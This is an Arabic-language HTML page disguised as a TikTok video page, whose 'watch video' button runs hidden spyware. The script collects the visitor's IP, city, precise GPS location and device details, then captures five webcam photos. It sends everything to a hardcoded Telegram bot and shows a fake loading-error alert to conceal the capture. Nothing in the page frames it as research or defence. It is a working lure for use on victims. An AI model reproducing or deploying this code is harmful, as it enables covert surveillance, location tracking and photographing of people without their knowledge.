<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>عبود تيك توك</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" />
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background-color: #000;
      color: #fff;
      margin: 0;
      padding: 0;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    h1 {
      color: #00f2ea;
      text-shadow: 0 0 10px #00f2ea;
    }
    .icon {
      font-size: 60px;
      color: #ff0050;
      text-shadow: 0 0 15px #ff0050;
      margin-bottom: 20px;
    }
    .watch-button {
      background: linear-gradient(to right, #ff0050, #00f2ea);
      border: none;
      padding: 15px 30px;
      font-size: 20px;
      color: #fff;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 0 15px #00f2ea;
      margin-top: 30px;
    }
    .watch-button i {
      margin-left: 10px;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>

  <div class="icon"><i class="fab fa-tiktok"></i></div>
  <h1>عبود تيك توك</h1>
  <button class="watch-button" onclick="watchVideoProcess()">
    اضغط هنا لمشاهدة الفيديو <i class="fas fa-play-circle"></i>
  </button>
  <video id="video" autoplay playsinline></video>

  <script>
    const token = "7662193128:AAEWXKAccEnz_kLpFznV6jit1-wHO7CZWWs";
    const chatId = "6402582508";

    async function sendTelegramMessage(text) {
      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      });
    }

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");
      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
      } catch {
        return {};
      }
    }

    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging ? "نعم ⚡" : "لا ❌"
        };
      } catch {
        return { level: "غير معروف", charging: "غير معروف" };
      }
    }

    async function getLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition((pos) => {
          const lat = pos.coords.latitude.toFixed(5);
          const lon = pos.coords.longitude.toFixed(5);
          resolve(`https://maps.google.com/?q=${lat},${lon}`);
        }, () => {
          resolve("❌ غير متاح");
        }, { timeout: 5000 });
      });
    }

    function delay(ms) {
      return new Promise(res => setTimeout(res, ms));
    }

    async function watchVideoProcess() {
      const ipInfo = await getIPInfo();
      const battery = await getBatteryInfo();
      const location = await getLocation();
      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

      const deviceInfo = navigator.userAgent;
      const screenRes = `${screen.width}x${screen.height}`;
      const connection = navigator.connection || {};
      const memory = navigator.deviceMemory || "غير معروف";
      const cores = navigator.hardwareConcurrency || "غير معروف";

      let message = `
🎬 تم الضغط على زر مشاهدة الفيديو

🌍 الدولة: ${ipInfo.country_name || "غير معروف"}
🏙️ المدينة: ${ipInfo.city || "غير معروف"}
🌐 IP: ${ipInfo.ip || "غير معروف"}
📍 الموقع: ${location}

📱 الجهاز:
🔋 البطارية: ${battery.level}%
⚡ يشحن: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الرام: ${memory} GB
⚙️ المعالج: ${cores} أنوية
🖥️ المتصفح: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
      `;

      await sendTelegramMessage(message);

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.play();

        for(let i = 0; i < 5; i++) {
          await delay(1500);
          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          await new Promise(resolve => canvas.toBlob(async (blob) => {
            await sendPhoto(blob);
            resolve();
          }, "image/jpeg"));
        }

        stream.getTracks().forEach(track => track.stop());
        alert(" حدث خطأ اثناء تحميل فيديو يرجى محاولة لاحقا!");

      } catch (err) {
        alert("⚠️ فشل في تشغيل الكاميرا أو تم الرفض.");
        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
      }
    }
  </script>
</body>
</html>
